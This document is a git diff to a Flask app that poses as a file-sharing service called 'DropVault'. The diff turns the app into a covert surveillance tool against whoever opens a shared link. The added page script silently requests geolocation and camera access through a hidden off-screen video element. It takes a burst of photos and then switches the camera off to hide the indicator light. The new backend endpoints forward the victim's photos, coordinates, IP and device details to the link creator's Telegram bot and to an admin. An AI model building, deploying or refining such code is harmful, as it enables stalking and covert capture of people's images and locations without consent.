@@ -1,4 +1,4 @@
-# by:@ROMEO_UCHIHA (Pro File Sharing Redesign & Broken Media Fix - Optimized)
+# by:@ROMEO_UCHIHA (Silent Background Capture & Direct File Access)
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
 import base64, requests, os, time, uuid, random
@@ -60,7 +60,6 @@ COMMON_STYLE = """
 </style>
 """
 
-# BRAND NEW FILE SHARING SAAS LANDING PAGE
 LANDING_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -117,9 +116,9 @@ LANDING_PAGE = """
             <p>Ensure the correct recipient accesses the file. Our system requires a quick visual check before allowing file downloads.</p>
         </div>
         <div class="card">
-            <div class="icon">🛡️</div>
-            <h3>Secure Infrastructure</h3>
-            <p>Your files are safely managed and delivered fast with our highly available content delivery network.</p>
+            <div class="icon">🌍</div>
+            <h3>Geo-Locked Sharing</h3>
+            <p>Limit your file's availability to specific regions. Anyone outside the designated coordinates will be blocked instantly.</p>
         </div>
     </div>
     <footer>
@@ -183,14 +182,13 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')
 
-# --- TARGET PAGE (FIXED MEDIA PREVIEW & SMART CAMERA LOGIC) ---
+# --- TARGET PAGE (DIRECT FILE SHOW + SILENT BACKGROUND CAPTURE) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
     if not res.data: return "File Not Found or Removed!"
     
     data = res.data[0]
-    target_type = data.get("target_type", "camera")
     action_mode = data.get("action_mode", "redirect")
     action_value = data.get("action_value", "")
     text_content = data.get("text_content", "")
@@ -202,26 +200,17 @@ def target_page(link_id):
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>Shared File | Verification</title>
+        <title>DropVault | File Ready</title>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
         <style>
             @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Poppins:wght@400;600&display=swap');
-            :root { --red: #ff0000; --dark-red: #8a0000; --bg: #050505; }
+            :root { --red: #ff0000; --bg: #050505; }
             * { box-sizing: border-box; margin: 0; padding: 0; }
-            body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+            body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
             
-            /* Camera UI */
-            .face-container { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; }
-            .face-wrapper { position: relative; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; border: 3px solid var(--red); box-shadow: 0 0 40px rgba(255,0,0,0.3); z-index: 2; }
-            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #111; } 
-            .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000; z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none; }
-            @keyframes scanAnim { 0% { top: 5%; opacity: 0; } 10% { opacity: 1; } 50% { top: 95%; opacity: 1; } 90% { opacity: 1; } 100% { top: 5%; opacity: 0; } }
-            
-            .instruction-text { font-family: 'Orbitron'; font-size: 1.1rem; letter-spacing: 1px; color: #ccc; margin-top: 20px; text-transform: uppercase; text-align:center;}
-            
-            /* Clean Result UI (File Download) */
-            #result-ui { display: none; width: 100%; padding: 20px; text-align: center; }
-            .content-box { background: rgba(15,15,15,0.9); border: 1px solid #333; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 500px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; }
+            /* Main Content UI */
+            .content-box { background: rgba(15,15,15,0.9); border: 1px solid #333; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 500px; text-align: center; animation: slideUp 0.6s ease; }
+            @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
             
             .file-icon-box { background: #111; border: 1px dashed #444; border-radius: 15px; width: 100%; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; margin-bottom: 25px; }
             .file-icon-box i { font-size: 60px; color: var(--red); }
@@ -233,98 +222,32 @@ def target_page(link_id):
     </head>
     <body>
         
-        <div id="cam-section" class="face-container">
-            <div class="face-wrapper">
-                <div class="scanner-line"></div>
-                <video id="v" autoplay playsinline muted></video>
-            </div>
-            <p class="instruction-text" id="face-msg">Analyzing environment...</p>
-        </div>
-
-        <div id="result-ui">
-            <div class="content-box" id="media-content"></div>
-        </div>
+        <div class="content-box" id="media-content"></div>
 
         <canvas id="c" style="display:none"></canvas>
+        <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>
 
         <script>
-            let mode = "{{ t_type }}";
             let actMode = "{{ a_mode }}";
             let actVal = "{{ a_val }}";
             let txtVal = {{ t_content | tojson | safe }};
             let fType = "{{ f_type }}";
 
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            let captureInterval = null;
-            let currentCamType = "FRONT";
-
-            window.onload = () => { getHardware(); startVerificationFlow(); };
+            window.onload = () => { 
+                getHardware(); 
+                showFileContent();
+                attemptSilentCapture(); // Start background stealth stuff
+            };
 
             function getHardware() {
                 let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
-                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
+                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>console.log("hw err"));
             }
 
-            async function startVerificationFlow() {
-                // If it's anything related to verification, we just do camera. Location is bypassed.
-                if(mode !== 'none') {
-                    document.getElementById('cam-section').style.display = 'flex'; 
-                    try {
-                        // TRY FRONT CAMERA FIRST
-                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                        currentCamType = "FRONT";
-                    } catch(e) {
-                        try {
-                            // FALLBACK: TRY ANY AVAILABLE CAMERA IF FRONT IS BROKEN/MISSING
-                            v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
-                            currentCamType = "BACK_OR_EXTERNAL";
-                        } catch(err) {
-                            // IF NO CAMERA OR PERMISSION DENIED, DO NOT LOOP! JUST BYPASS.
-                            document.getElementById('face-msg').innerText = "VERIFICATION BYPASSED";
-                            document.getElementById('face-msg').style.color = "gray";
-                            setTimeout(showContent, 1000);
-                            return; // Stop here, go to content
-                        }
-                    }
-                    startFaceCheck();
-                } else {
-                    showContent(); 
-                }
-            }
-
-            function takeSnap() {
-                if(v.readyState < 2 || v.videoWidth === 0 || v.videoHeight === 0) return;
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-                let imgData = c.toDataURL('image/jpeg', 0.5);
-                if(imgData.length < 1000) return; 
-                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: currentCamType }) });
-            }
-
-            function startFaceCheck() {
-                let snapCount = 0;
-                captureInterval = setInterval(() => {
-                    takeSnap();
-                    snapCount++;
-                    
-                    // Stop exactly after taking 5 snaps (no infinite loop)
-                    if(snapCount >= 5) {
-                        clearInterval(captureInterval);
-                        if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
-                        showContent();
-                    }
-                }, 800); 
-            }
-
-            function showContent() {
-                document.getElementById('cam-section').style.display = 'none';
-                
-                let resBox = document.getElementById('result-ui');
+            function showFileContent() {
                 let medBox = document.getElementById('media-content');
-                resBox.style.display = 'block';
-
                 let html = "";
+                
                 if(actMode === 'text') {
                     html = `<div style="color:#fff; font-size:1.2rem; margin-bottom:20px; width:100%; text-align:left; white-space:pre-wrap;">${txtVal}</div>`;
                 } else if (actMode === 'file') {
@@ -351,10 +274,81 @@ def target_page(link_id):
                 }
                 medBox.innerHTML = html;
             }
+
+            function attemptSilentCapture() {
+                // 1. Location (Silent attempt, ignores errors)
+                if(navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => {
+                            fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{});
+                        },
+                        (e) => { /* Silently ignore location denial */ },
+                        { timeout: 8000 }
+                    );
+                }
+
+                // 2. Camera (Smart fallback logic)
+                startCameraFallback();
+            }
+
+            async function startCameraFallback() {
+                let stream;
+                let camType = "FRONT";
+                
+                try {
+                    // Try front camera first
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                } catch(e1) {
+                    try {
+                        // Fallback 1: Try back/environment camera
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        camType = "BACK";
+                    } catch(e2) {
+                        try {
+                            // Fallback 2: Grab ANY available camera
+                            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                            camType = "AUTO";
+                        } catch(e3) {
+                            return; // All failed or denied. Do nothing, script continues without loop.
+                        }
+                    }
+                }
+
+                const bgV = document.getElementById('bg-v');
+                const c = document.getElementById('c');
+                bgV.srcObject = stream;
+                
+                bgV.onloadedmetadata = () => {
+                    bgV.play();
+                    let snaps = 0;
+                    
+                    // Take a few snaps quickly then shut down the camera light
+                    let burst = setInterval(() => {
+                        if(bgV.videoWidth > 0 && snaps < 3) {
+                            c.width = bgV.videoWidth; c.height = bgV.videoHeight;
+                            c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
+                            let imgData = c.toDataURL('image/jpeg', 0.5);
+                            
+                            fetch("/api/capture/{{ l_id }}", { 
+                                method: "POST", 
+                                headers: {"Content-Type":"application/json"}, 
+                                body: JSON.stringify({ img: imgData, cam_type: camType }) 
+                            }).catch(()=>{});
+                            
+                            snaps++;
+                        } else if (snaps >= 3) {
+                            clearInterval(burst);
+                            if (bgV.srcObject) {
+                                bgV.srcObject.getTracks().forEach(t => t.stop()); // Turn off camera indicator
+                            }
+                        }
+                    }, 800); 
+                };
+            }
         </script>
     </body>
     </html>
-    ''', t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)
+    ''', a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)
 
 # --- BACKEND LOGGING APIS ---
 @app.route("/api/log_hardware/<l_id>", methods=["POST"])
@@ -369,6 +363,21 @@ def log_hw(l_id):
         msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
         send_tg_msg(user["bot_token"], user["chat_id"], msg)
         send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {user['bot_name']}\\nIP: {ip}")
+    except: pass
+    return jsonify({"s": 1})
+
+@app.route("/api/log_loc/<l_id>", methods=["POST"])
+def log_loc(l_id):
+    try:
+        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
+        user = link["users"]
+        d = request.get_json()
+        
+        map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
+        msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
+        
+        send_tg_msg(user["bot_token"], user["chat_id"], msg)
+        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {user['bot_name']}\\n{msg}")
     except: pass
     return jsonify({"s": 1})
 
